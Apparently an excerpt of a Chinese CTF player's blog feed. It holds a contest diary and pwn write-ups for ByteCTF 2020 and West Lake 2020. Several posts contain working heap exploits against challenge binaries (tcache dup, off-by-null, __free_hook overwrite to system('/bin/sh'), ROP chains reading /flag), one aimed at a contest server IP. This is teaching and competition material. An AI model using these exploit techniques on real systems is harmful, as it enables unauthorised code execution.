+&lt;p&gt;拔下hdmi来插电脑，不管用。&lt;/p&gt;
+
+&lt;p&gt;然后👴看不下去了，直接拿起遥控器一通乱点，点到了&lt;code&gt;电视直播&lt;/code&gt;这一项。右上角显示&lt;code&gt;hdmi已连接&lt;/code&gt;。aidai的桌面翼然显示在带屏幕上。看来还是得pwn👴👴出🐴。&lt;/p&gt;
+
+&lt;h4 id=&quot;口乞&quot;&gt;口乞&lt;/h4&gt;
+
+&lt;p&gt;没整到啥🔥。BPL和aidai突然想要点个外卖吃。本来这晚饭就不是很好，就是嗨带还好点，我就顺便让他们给点了点🐔吃。整了一份鸡叉，一份🌶的鸡架，一份不🌶的鸡架。三个人就搁小茶几上口乞了一会儿。鸡叉整的稍微有点干，吃起来有点划嘴。鸡架就差不多，孜然与鸡肉的香嫩结合在一起，口感相当不错。只不过稍微有点咸。&lt;/p&gt;
+
+&lt;p&gt;由于这里两只手上全是🐔，没法拍照。&lt;/p&gt;
+
+&lt;h4 id=&quot;千钧一发&quot;&gt;千钧一发&lt;/h4&gt;
+
+&lt;p&gt;之后我们便开始准备明天的省赛了。&lt;/p&gt;
+
+&lt;p&gt;配环境，各种题库，工具都给备齐了。然后各回各家，准备睡觉。&lt;/p&gt;
+
+&lt;p&gt;突然想到博客啥的还没存。原因是aidai给👴发了个这个：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/省赛/博客1.png&quot; alt=&quot;博客1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;他搁这儿clone👴的博客拖不下来呢。于是我们直接回到整🔥地。直接U盘交换博客。这博客之后帮我解了一道题，后面会提到。&lt;/p&gt;
+
+&lt;p&gt;之后我还从他那儿嫖了一份CyberChef，也帮我解了一道题。&lt;/p&gt;
+
+&lt;h2 id=&quot;第二天拿钱&quot;&gt;第二天——拿钱&lt;/h2&gt;
+
+&lt;p&gt;进场主办方致敬ylb，现场放音乐恶心人。（后面听的时候其实不是很阴间&lt;/p&gt;
+
+&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;amp;id=29562457&amp;amp;auto=0&amp;amp;height=66&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;此曲非现场所放，仅用于致敬ylb。&lt;/p&gt;
+
+&lt;p&gt;赛前领导随便讲了点话比赛就开始了。选择题一共遇到不到三个关于二进制的题目，直接gg，蒙着过。&lt;/p&gt;
+
+&lt;p&gt;年轻人不讲武德，上来就是一个web签到，一个流量包，一个编码题，我全没防出去啊。全没防出去自然是去看pwn题，第一题格式化字符串秒了，我笑一下，直接去看100分pwn，一个libc2.31，一个cet，一个off-by-null，我这时候收拳不打了。&lt;/p&gt;
+
+&lt;p&gt;直接去看密码学，第一题在我还在做选择题的时候aidai已经把它秒了。我直接&lt;code&gt;command+space&lt;/code&gt;做题大法，找出了aidai以前的crypto脚本，一套，出答案。然后交flag，结果显示不对。&lt;/p&gt;
+
+&lt;p&gt;后来才发现是平台抽风了。此处再次致敬ylb。&lt;/p&gt;
+
+&lt;p&gt;收拳之后，自然是去日流量包。wireshark打不开，于是尝试strings一下试试。出现了以&lt;code&gt;ZmxhZw&lt;/code&gt;开头的base64，我知道这是flag了。&lt;/p&gt;
+
+&lt;p&gt;然后就一个题都不会做了。&lt;/p&gt;
+
+&lt;p&gt;突然想试试能不能把pwn题给做了加点分混个一等奖啥的，突然发现add时没有进行清空，这tm堆直接泄露了unlink啊。我直接来，骗，来，偷袭，这100分的老pwn题。直接一通操作把pwn题秒了，把👴的吊名挂在了funheap的一血位置上。大约12：10分左右出了。👴开始吃饭。&lt;/p&gt;
+
+&lt;p&gt;不到一会儿，aidai也把这题给出了二血。组委会直接派俩人来要exp，小伙子你怎么回事。我说老师我错了错了，我不懂规矩，我把exp给你。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+#a = process(&quot;./funheap&quot;)
+libc = ELF(&quot;./funheap&quot;)
+elf = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;)
+#context.log_level = 'debug'
+
+choo = lambda x : a.sendlineafter(&quot;CMD &amp;gt;&amp;gt;&quot;,str(x))
+
+def add(size):
+	choo(1)
+	a.sendlineafter(&quot;Size:&quot;,str(size))
+
+def show(idx):
+	choo(3)
+	a.sendlineafter(&quot;Index:&quot;,str(idx))
+
+def free(idx):
+	choo(2)
+	a.sendlineafter(&quot;Index:&quot;,str(idx))
+
+def edit(idx,con):
+	choo(4)
+	a.sendlineafter(&quot;Index:&quot;,str(idx))
+	a.sendlineafter(&quot;Note:&quot;,con)
+
+add(0x20)
+add(0x20)
+free(0)
+free(1)
+add(0x20)#0
+show(0)
+a.recvuntil(&quot;Note:&quot;)
+heap_base = u64(a.recv(6).ljust(8,b'\x00'))
+log.info(&quot;heap_base = &quot;+hex(heap_base))
+add(0x500)#1
+add(0x68)#2
+add(0x4f8)#3
+add(0x18)#4
+payload = p64(0)+p64(0x571)+p64(heap_base+0x60)+p64(heap_base+0x60)
+edit(1,payload)
+edit(2,b'a'*0x60+p64(0x570))
+free(3)
+add(0x4f0)#3
+show(2)
+pause()
+libc_base = u64(a.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x1ebbe0
+log.info(&quot;libc_base = &quot;+hex(libc_base))
+add(0x68)#5
+add(0x68)#6
+add(0x480)#7
+free(6)
+free(5)
+edit(2,p64(libc_base+elf.sym[&quot;__free_hook&quot;]))
+add(0x68)#5
+add(0x68)#6
+edit(6,p64(libc_base+elf.sym[&quot;system&quot;]))
+edit(5,&quot;/bin/sh&quot;)
+free(5)
+a.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;（这里组委会一定不知道aidai👴👴跟👴都是pwn👴👴&lt;/p&gt;
+
+&lt;p&gt;这一题100分，直接让我从下边飞起直上第一，从这以后我就再也没掉下来过。&lt;/p&gt;
+
+&lt;p&gt;我收拳这时候不打了，转去做时间刺客。没看到hint搁那儿爆破了老一会儿。最后看到了hint，用CyberChef转时间戳，直接一把唆了。&lt;/p&gt;
+
+&lt;p&gt;一会儿看js解的人也挺多，直接去看js。控制台输进去发现字符跟输出的两位是一一对应的，直接拿个python字典唆了。&lt;/p&gt;
+
+&lt;p&gt;之后干看着屏幕盯了好几个小时。看到coin哥哥ak了密码还顶不上我一半，属实有点心疼密码。&lt;/p&gt;
+
+&lt;p&gt;最后比赛就这么愉快的结束了。爱好者组稳第一。&lt;/p&gt;
+
+&lt;h3 id=&quot;赛后&quot;&gt;赛后&lt;/h3&gt;
+
+&lt;p&gt;coin哥哥见了我第一句话：&lt;code&gt;*你*&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;Milu见了我：&lt;code&gt;你看这家伙这个b脸&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;aidai：我恭喜你发财了.jpg&lt;/p&gt;
+
+&lt;p&gt;只有杰哥跟我谈笑风生。&lt;/p&gt;
+
+&lt;p&gt;搁那儿玩了一会儿。到特等奖了，只有👴一个人上台，享受贵宾级待遇。一会儿一个带领导来给👴颁奖。之后合影。下去领钱，3w，钱厚的一匹。&lt;/p&gt;
+
+&lt;p&gt;趁数钱这空里aidai给👴拍下来了，tmd这照片全校出名了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/省赛/数钱1.jpg&quot; alt=&quot;数钱&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;夜店，曲老师请客，口乞了一顿挺不戳。&lt;/p&gt;
+
+&lt;p&gt;之后还有Milu的操作：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/省赛/门口牌子.jpg&quot; alt=&quot;门口牌子&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;醉饮九回潇洒去万军从中取首级&quot;&gt;醉饮九回潇洒去，万军从中取首级&lt;/h2&gt;
+
+&lt;p&gt;醉饮九回潇洒去，即此行余等是来玩的，不管结果如何只管潇洒去来。&lt;/p&gt;
+
+&lt;p&gt;万军从中取首级，即私抓住pwn的机会，一举拿到制胜的最关键一点。&lt;/p&gt;
+
+&lt;p&gt;虽说运气成分很大，但还是要好好努力。争取在更加大的舞台上留下👴的脚印。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="life" /><summary type="html">醉饮九回潇洒去，万军从中取首级——2020省赛之旅</summary></entry><entry><title type="html">Bytectf2020pwn整理和复现</title><link href="http://localhost:4000/_posts/2020-10-29-Bytectf2020pwn%E6%95%B4%E7%90%86%E5%92%8C%E5%A4%8D%E7%8E%B0/" rel="alternate" type="text/html" title="Bytectf2020pwn整理和复现" /><published>2020-10-29T00:00:00+08:00</published><updated>2020-10-29T00:00:00+08:00</updated><id>http://localhost:4000/_posts/Bytectf2020pwn%E6%95%B4%E7%90%86%E5%92%8C%E5%A4%8D%E7%8E%B0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-10-29-Bytectf2020pwn%E6%95%B4%E7%90%86%E5%92%8C%E5%A4%8D%E7%8E%B0/">&lt;h1 id=&quot;bytectf2020pwn&quot;&gt;Bytectf2020pwn&lt;/h1&gt;
+
+&lt;p&gt;这次比赛差一点就进线下了呜呜呜，wtcl。两道堆题都是做到一半就被cnitlrt师傅秒了，tql。剩下的golang pwn直接看自闭了呜呜呜。整理一下几道题的思路，学习一下。&lt;/p&gt;
+
+&lt;h2 id=&quot;easyheap&quot;&gt;easyheap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ checksec easyheap
+[*] '/root/work/easyheap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+$ file easyheap    
+easyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=028736f7d4457a774846fa739ea450bee2cfa5eb, for GNU/Linux 3.2.0, stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;主要函数：add，里面有一个任意地址off-by-null。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned __int64 add()
+{
+  __int16 v1; // [rsp+8h] [rbp-18h]
+  __int16 v2; // [rsp+Ah] [rbp-16h]
+  int i; // [rsp+Ch] [rbp-14h]
+  void *s; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v5; // [rsp+18h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  for ( i = 0; i &amp;lt;= 7 &amp;amp;&amp;amp; *(&amp;amp;unk_4060 + 4 * i); ++i )
+    ;
+  if ( i &amp;lt;= 7 )
+  {
+    v2 = 0;
+    printf(&quot;Size: &quot;);
+    __isoc99_scanf(&quot;%hd&quot;, &amp;amp;v1);
+    v2 = v1; //输入一个非法数进循环，然后就保留了下来
+    if ( v1 &amp;lt;= 0 || v1 &amp;gt; 128 )
+    {
+      do
+      {
+        do
+        {
+          puts(&quot;Invalid size.&quot;);
+          printf(&quot;Size: &quot;, &amp;amp;v1);
+          __isoc99_scanf(&quot;%hd&quot;, &amp;amp;v1);
+        }
+        while ( v1 &amp;lt;= 0 );
+      }
+      while ( v1 &amp;gt; 0x80 );
+    }
+    else
+    {
+      v2 = v1;
+    }
+    s = malloc(v1);
+    if ( !s )
+    {
+      puts(&quot;Malloc error.&quot;);
+      exit(2);
+    }
+    memset(s, 0, v1);
+    printf(&quot;Content: &quot;, 0LL);
+    myread(s, v1);
+    *(s + v2 - 1) = 0;
+    *(&amp;amp;unk_4060 + 4 * i) = v1;
+    chunklist[2 * i] = s;
+    puts(&quot;Finish.&quot;);
+  }
+  else
+  {
+    puts(&quot;Too many chunks.&quot;);
+  }
+  return __readfsqword(0x28u) ^ v5;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;思路：tcache dup打size，free得到libc_base。再tcache dup，打&lt;code&gt;__malloc_hook&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;wtcl，真的。等看到这个洞的时候题已经被cnitlrt师傅秒了。wtcl。&lt;/p&gt;
+
+&lt;h3 id=&quot;exp&quot;&gt;exp&lt;/h3&gt;
+
+&lt;p&gt;交互&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+from random import randint
+a = process([&quot;./easyheap&quot;],env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so.9.1&quot;})
+libc = ELF(&quot;./libc-2.31.so.9.1&quot;)
+#context.log_level = 'debug'
+
+choo = lambda x:a.sendlineafter(&quot;&amp;gt;&amp;gt;&quot;,str(x))
+size = lambda x:a.sendlineafter(&quot;Size:&quot;,str(x))
+cont = lambda x:a.sendlineafter(&quot;Content:&quot;,x)
+inde= lambda x:a.sendlineafter(&quot;Index:&quot;,str(x))
+ia = lambda : a.interactive()
+
+
+def add(sz,nm):
+    choo(1)
+    size(sz)
+    cont(nm)
+
+def aadd(sz1,sz2,nm):
+    choo(1)
+    size(sz1)
+    size(sz2)
+    cont(nm)
+
+def show(idx):
+    choo(2)
+    inde(idx)
+
+def free(idx):
+    choo(3)
+    inde(idx)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;先off-by-null改fd拿到size位置。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;add(0x68, b&quot;\x00&quot; * 0x50+p64(0)+p64(0x91)+p64(0))#0
+add(0x80,&quot;\x00&quot;*0x80)#1
+add(0x60, &quot;\x00&quot; * 0x60)#2
+free(2)
+free(0)
+aadd(-(0x16f),0x80,&quot;\x00&quot;*0x80)#0
+add(0x68,b&quot;\x00&quot; * 0x50+p64(0)+p64(0x91)+p64(0))#2 0x91伪造overlapping chunk的size位置等会儿可以free
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后通过大量的malloc、free将next chunk设为合法。&lt;/p&gt;
+
+&lt;p&gt;从而拿到libc。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;add(0x80,&quot;a&quot;*0x80)#3
+add(0x80,&quot;a&quot;*0x80)#4
+add(0x80,&quot;a&quot;*0x80)#5
+add(0x80,&quot;a&quot;*0x80)#6
+free(3)
+add(0x78,&quot;a&quot;*0x78)#3
+free(3)
+add(0x48,&quot;\n&quot;)
+free(3)
+add(0x28,&quot;\n&quot;)
+free(3)
+add(0x38,&quot;\n&quot;)
+free(3)
+add(0x18,&quot;\n&quot;)
+free(3)
+add(0x68,p64(0)+p64(0x511)+b&quot;\n&quot;)#3
+free(1)
+add(0x80,&quot;\n&quot;)#1
+add(0x80,&quot;\n&quot;)#7
+free(1)
+add(0x68,&quot;/bin/sh\x00&quot;)#1
+show(0)
+libc_base = u64(a.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00'))-0x1ebbe0
+log.info(f&quot;{libc_base = :#x}&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;再用overlapping的那个chunk打&lt;code&gt;__free_hook&lt;/code&gt;。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;free(7)
+free(3)
+free(2)
+add(0x80,p64(0)+p64(0x91)+p64(libc_base+libc.sym['__free_hook']))
+add(0x80,'a')
+add(0x80,p64(libc_base+libc.sym['system']))
+free(1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;得到shell&lt;/p&gt;
+
+&lt;h2 id=&quot;gun&quot;&gt;gun&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;# file gun
+gun: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=936c46e401068c3ca722e49ec2c8668a027e5374, for GNU/Linux 3.2.0, stripped
+# checksec gun
+[*] '/root/work/gun'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;libc2.31、开seccomp、开CET，恰💰三部曲。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt; line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
+ 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
+ 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;功能：&lt;/p&gt;
+
+&lt;p&gt;三个功能，一个是加一个堆块，一个是将一个堆块放入将要free的链表中，另一个是递归free链表中的chunk。&lt;/p&gt;
+
+&lt;p&gt;由于free之前先泄露内容，free之后用于free的指针没有清零，因此可以轻松地进行leak和double free。这里不再写这一步骤。&lt;/p&gt;
+
+&lt;p&gt;主要写一下double free得到&lt;code&gt;__free_hook&lt;/code&gt;之后要去干啥。&lt;/p&gt;
+
+&lt;p&gt;现在最清晰的思路就是开启&lt;code&gt;setcontext+61&lt;/code&gt;然后进行orw的ROP。但是当程序进入到&lt;code&gt;setcontext+61&lt;/code&gt;的时候发现rdx并不满足要求，程序会直接crash掉。因此我们需要换一种思路。&lt;/p&gt;
+
+&lt;p&gt;再一种思路就是先进行栈迁移，再ROP。（你要是想直接ROP，当我没说）这就涉及到一个问题，怎么进行栈迁移呢？&lt;/p&gt;
+
+&lt;p&gt;有一种叫PCOP的技术。与ROP和JOP类似，这种gadget是以一个call命令结尾的，能够利用这个进行一次任意地址的call。&lt;/p&gt;
+
+&lt;p&gt;如果执意要进行setcontext，我们的本意就不是进行任意地址调用，而是利用PCOP的前置参数传递来进行寄存器数值，从而使得setcontext不会crash掉。这个思路详情请见隔壁&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;amp;mid=2247485618&amp;amp;idx=1&amp;amp;sn=8b3c727895841ca7e3d1b085b05d2930&amp;amp;chksm=9760fc64a0177572a91da0c6a0da7b1e95f9749c3fe77a305f0b33bb08826fbc70f992d29345&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=1027LAcg4cyTCOgt9uvo0n7r&amp;amp;sharer_sharetime=1603769353787&amp;amp;sharer_shareid=2b0ae855257c7b8d85dd6333d1f3b7fa%23rd&quot;&gt;W&amp;amp;M Bytectf2020 Writeup&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;然后说一下栈迁移的思路。有些PCOP的gadget长成这样：&lt;code&gt; mov rdx, qword ptr [rdi + 8]; ...... ; call qword ptr [rdx + 0x20];&lt;/code&gt;，像这样的gadget可以控制rdx，同时又可以call一次，而我们只要在&lt;code&gt;[rdx+0x20]&lt;/code&gt;放入&lt;code&gt;0x000000000005e650: mov rsp, rdx; ret;&lt;/code&gt;这个，就可以进行一次栈迁移。布置好ROP链，然后进行orw。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;payload1 = p64(0) +p64(heap_base+0x7e0)+b&quot;/flag\x00\x00\x00\n&quot;
+add(0x40,payload1)
+payload2 = p64(rdi_ret)+p64(heap_base+0x7a0) + p64(rsi_ret2)+p64(0) + p64(gg) + p64(open_)
+payload2 += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(heap_base+0x7e0) + p64(rdx_ret) + p64(0x30)+p64(0) + p64(read)
+payload2 += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(heap_base+0x7e0) + p64(rdx_ret) + p64(0x30)+p64(0) + p64(write)
+add(0xb0,payload2+b&quot;\n&quot;)
+load(12)
+pause()
+free(1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;free第一个堆块的时候会将堆地址给到rdi。然后会将&lt;code&gt;[rdi + 8]&lt;/code&gt;给rdx，在这个地方填入ROP链的地址然后在ROP链+0x20的位置填入&lt;code&gt;mov rsp, rdx&lt;/code&gt;的地址，等到ROP的时候通过pop将此gadget出链即可。&lt;/p&gt;
+
+&lt;h2 id=&quot;leak&quot;&gt;leak&lt;/h2&gt;
+
+&lt;p&gt;从golang的github仓库里面找issue，找到一个编译器的bug &lt;a href=&quot;https://github.com/golang/go/issues/40367&quot;&gt;github issue 40367&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这个bug可以无限打印栈上的信息。&lt;/p&gt;
+
+&lt;p&gt;这么输入就行了&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;func hack() {
+        rates:=[]int32{1,2,3,4,5,6}
+    for star, rate := range rates {
+        if star+1 &amp;lt; 1 {
+            panic(&quot;&quot;)
+        }
+
+
+        println(star, string(rate-1))
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;输出类似这样：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0 ^@
+1 ^A
+2 ^B
+3 ^C
+4 ^D
+5 ^E
+6 �
+7 ¿
+8 𶝏
+9 ¿
+10 �
+11 �
+12 f
+13 �
+14 l
+15 �
+16 a
+17 �
+18 g
+19 �
+20 {
+21 �
+22 }
+23 �
+24 ^@
+25 �
+26 ^@
+27 �
+28 ^@
+29 �
+30 ^@
+31 �
+32 ^@
+33 �
+34 ^@
+35 �
+36 ^@
+37 �
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;学了几个gadget，认识了几个带佬，没进线下，wtcl。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">Bytectf2020pwn</summary></entry><entry><title type="html">2020西湖论剑线上赛及复现</title><link href="http://localhost:4000/_posts/2020-10-11-2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%8F%8A%E5%A4%8D%E7%8E%B0/" rel="alternate" type="text/html" title="2020西湖论剑线上赛及复现" /><published>2020-10-11T00:00:00+08:00</published><updated>2020-10-11T00:00:00+08:00</updated><id>http://localhost:4000/_posts/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%8F%8A%E5%A4%8D%E7%8E%B0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-10-11-2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%8F%8A%E5%A4%8D%E7%8E%B0/">&lt;h1 id=&quot;2020西湖论剑pwn&quot;&gt;2020西湖论剑PWN&lt;/h1&gt;
+
+&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;这次比赛是我第一次跟V&amp;amp;N的人组队打的一场比赛。队友是xmao和v0id。由于我比较菜，我们队伍没能晋级到线下赛。因此及时反思一下，并且复现一下比赛题目，进行学习。&lt;/p&gt;
+
+&lt;h2 id=&quot;已出&quot;&gt;已出&lt;/h2&gt;
+
+&lt;h3 id=&quot;mmutag&quot;&gt;mmutag&lt;/h3&gt;
+
+&lt;p&gt;一个UAF的漏洞。给了栈地址，并且有输入可以控制栈上数据，能泄露canary。直接&lt;code&gt;malloc_to_stack&lt;/code&gt;进行常规ROP。&lt;/p&gt;
+
+&lt;h4 id=&quot;exp&quot;&gt;exp&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+#io = process(&quot;./mmutag&quot;)
+io = remote(&quot;183.129.189.62&quot;,59304)
+elf = ELF(&quot;./mmutag&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+#context.log_level = 'debug'
+
+def add(idx,con):
+    io.sendlineafter(&quot;choise:&quot;,'1')
+    io.sendlineafter(&quot;id:&quot;,str(idx))
+    io.sendafter(&quot;content&quot;,con)
+
+def free(idx):
+    io.sendlineafter(&quot;choise:&quot;,'2')
+    io.sendlineafter(&quot;id:&quot;,str(idx))
+
+def myread(con):
+    io.sendlineafter(&quot;choise:&quot;,'3')
+    sleep(0.1)
+    io.send(con)
+
+rdi = 0x0000000000400d23
+
+io.sendafter(&quot;name:&quot;,'asdf')
+io.recvuntil(&quot;0x&quot;)
+stack = int(io.recv(12),16)
+log.info(&quot;stack : &quot;+hex(stack))
+io.sendlineafter(&quot;choice:&quot;,'2')
+myread('a'*0x19)
+io.recvuntil('a'*0x19)
+canary = u64(io.recv(7).rjust(8,&quot;\x00&quot;))
+log.info(&quot;canary : &quot;+hex(canary))
+myread(&quot;a&quot;*0x10+p64(0x71))
+add(1,'a')
+add(2,'a')
+free(1)
+free(2)
+free(1)
+add(3,p64(stack-0x38))
+add(4,p64(stack-0x38))
+add(5,p64(stack-0x38))
+payload = p64(canary)+p64(0)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400A99)
+add(6,payload)
+io.sendline(&quot;4&quot;)
+libc_base = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,'\x00'))-0x6f6a0
+log.info(&quot;libc_base : &quot;+hex(libc_base))
+myread(&quot;a&quot;*0x10+p64(0x71))
+free(1)
+free(2)
+free(1)
+add(7,p64(stack-0x18))
+add(8,p64(stack-0x18))
+add(9,p64(stack-0x18))
+payload = p64(canary)+p64(0)+p64(rdi)+p64(libc.search('/bin/sh').next()+libc_base)+p64(libc.sym['system']+libc_base)
+add(10,payload)
+
+io.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;妹出&quot;&gt;妹出&lt;/h2&gt;
+
+&lt;h3 id=&quot;managesystem&quot;&gt;managesystem&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;$ file pwn3
+pwn3: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+$ checksec pwn3
+[*] '/Users/sunyingli/Downloads/2020westlake/pwn/managesystem/pwn3'
+    Arch:     mips-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;32位的mips堆题目，有点阴间。&lt;/p&gt;
+
+&lt;p&gt;但是查了查mips的堆之后，得到：mips的堆分配器是&lt;code&gt;dlmalloc&lt;/code&gt;，而&lt;code&gt;ptmalloc&lt;/code&gt;很大程度上是基于&lt;code&gt;dlmalloc&lt;/code&gt;的。所以说简单的&lt;code&gt;ptmalloc&lt;/code&gt;堆漏洞对于mips也适用。&lt;/p&gt;
+
+&lt;h4 id=&quot;调试的对策&quot;&gt;调试的对策&lt;/h4&gt;
+
+&lt;p&gt;在exp里面这么写：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;io = process(['qemu-mipsel','-g','1234',&quot;-L&quot;,'./','./pwn3'])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;运行脚本之后等待&lt;code&gt;gdb-multiarch&lt;/code&gt;连接，我们运行&lt;code&gt;gdb-multiarch&lt;/code&gt;，输入&lt;code&gt;target remote:1234&lt;/code&gt;。即可连接。&lt;/p&gt;
+
+&lt;h4 id=&quot;反汇编的对策&quot;&gt;反汇编的对策&lt;/h4&gt;
+
+&lt;p&gt;ida没有对mips的F5，所以我们选用ida和cutter同时使用的方法进行反汇编。&lt;/p&gt;
+
+&lt;h4 id=&quot;解法&quot;&gt;解法&lt;/h4&gt;
+
+&lt;p&gt;最后在edit函数里面找到了堆溢出。明显有8字节的溢出。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt; iVar1 = (*_read)(0, *(undefined4 *)(*(int32_t *)0x4117a8 + iStack12 * 8), 
+                             *(int32_t *)(*(int32_t *)0x4117a8 + iStack12 * 8 + 4) + 8);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;因为没有PIE，直接进行&lt;code&gt;unlink&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;EXP&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+io = process(['qemu-mipsel',&quot;-L&quot;,'./','./pwn3'])
+#io = remote(&quot;node3.buuoj.cn&quot;,26789)
+libc = ELF(&quot;./lib/libc.so.0&quot;)
+context.arch = 'mips'
+
+def add(size,con):
+    io.sendlineafter(&quot;&amp;gt;&amp;gt;&quot;,'1')
+    io.sendlineafter(&quot;length:&quot;,str(size))
+    io.sendafter(&quot;info:&quot;,con)
+
+def free(idx):
+    io.sendlineafter(&quot;&amp;gt;&amp;gt;&quot;,'2')
+    io.sendlineafter(&quot;user:&quot;,str(idx))
+
